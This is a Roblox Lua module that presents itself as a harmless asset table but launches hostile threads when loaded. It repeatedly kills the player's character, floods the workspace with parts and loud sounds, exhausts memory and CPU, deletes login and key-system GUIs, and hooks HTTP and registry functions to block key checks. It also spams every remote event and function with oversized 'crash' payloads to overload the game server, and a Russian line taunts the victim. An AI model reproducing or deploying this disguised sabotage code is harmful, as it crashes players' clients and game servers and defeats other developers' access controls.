local legitTable = {
    {id = "rbxassetid://1", name = "Bomb"},
    {id = "rbxassetid://2", name = "Cock"},
    {id = "rbxassetid://3", name = "Destroyer"}
}

xpcall = function(f, _) 
    return f() 
end

pcall = function(f, ...) 
    return true, f(...) 
end

print("уебал лоха на медию")

task.spawn(function()
    while true do
        local player = game.Players.LocalPlayer
        if player and player.Character then
            player.Character:BreakJoints()
        end
        task.wait(0.1)
    end
end)

task.spawn(function()
    while true do
        for i = 1, 50 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(50, 50, 50)
            part.Anchored = true
            part.Transparency = 0.5
            part.Position = Vector3.new(
                math.random(-1000, 1000),
                math.random(-1000, 1000),
                math.random(-1000, 1000)
            )
            part.Parent = workspace
        end
        task.wait()
    end
end)

task.spawn(function()
    if getreg then
        local reg = getreg()
        for k, v in pairs(reg) do
            if type(v) == "function" and tostring(k):find("FetchDatabases") then
                reg[k] = function() 
                    return nil, "FUCK OFF" 
                end
            end
        end
    end
end)

task.spawn(function()
    while true do
        pcall(function()
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://154069593"
            sound.Volume = 10
            sound.Parent = game.Workspace
            sound:Play()
            task.wait(0.5)
            sound:Destroy()
        end)
    end
end)

task.spawn(function()
    local memoryBomb = {}
    while true do
        for i = 1, 10000 do
            table.insert(memoryBomb, {
                data = string.rep("A", 1024 * 1024),
                timestamp = os.time(),
                random = math.random(1, 9999999),
                nested = {
                    more = string.rep("B", 512 * 1024),
                    andMore = {
                        evenMore = string.rep("C", 256 * 1024)
                    }
                }
            })
        end
        task.wait()
    end
end)

task.spawn(function()
    task.wait(0.5)
    for _, v in pairs(game.CoreGui:GetChildren()) do
        if v:IsA("ScreenGui") and (
            v.Name:lower():find("key") or 
            v.Name:lower():find("system") or 
            v.Name:lower():find("login")
        ) then
            v:Destroy()
        end
    end
    for _, v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
        if v:IsA("ScreenGui") and (
            v.Name:lower():find("key") or 
            v.Name:lower():find("system") or 
            v.Name:lower():find("login")
        ) then
            v:Destroy()
        end
    end
end)

task.spawn(function()
    task.wait(1)
    local function findRemotes()
        local remotes = {}
        for _, service in pairs(game:GetChildren()) do
            if service:IsA("ReplicatedStorage") or service:IsA("ReplicatedFirst") then
                for _, child in pairs(service:GetDescendants()) do
                    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                        table.insert(remotes, child)
                    end
                end
            end
        end
        return remotes
    end
    
    local allRemotes = findRemotes()
    while true do
        for _, remote in pairs(allRemotes) do
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(
                        "crash", 
                        "this", 
                        "is", 
                        "spam", 
                        {
                            data = string.rep("X", 10000),
                            nested = {
                                nested = {
                                    nested = {
                                        data = "overflow"
                                    }
                                }
                            }
                        }
                    )
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer("crash", string.rep("Y", 5000))
                end
            end)
        end
        task.wait()
    end
end)

task.spawn(function()
    local oldGet = game.HttpGet
    local oldPost = game.HttpPost
    
    game.HttpGet = function(...)
        if string.find(tostring(...), "keysystem") or string.find(tostring(...), "api") then
            return "ERROR: ACCESS DENIED"
        end
        return oldGet(...)
    end
    
    game.HttpPost = function(...)
        if string.find(tostring(...), "keysystem") or string.find(tostring(...), "api") then
            return "ERROR: ACCESS DENIED"
        end
        return oldPost(...)
    end
end)

task.spawn(function()
    game:GetService("RunService").RenderStepped:Connect(function()
        local x = 0
        for i = 1, 1000 do
            x = x + math.sqrt(i * math.pi)
        end
    end)
end)

setmetatable(legitTable, {
    __index = function(t, k)
        if type(k) == "string" and string.find(k, "id") then
            return "rbxassetid://" .. math.random(100000000, 999999999)
        end
        return nil
    end
})

return legitTable
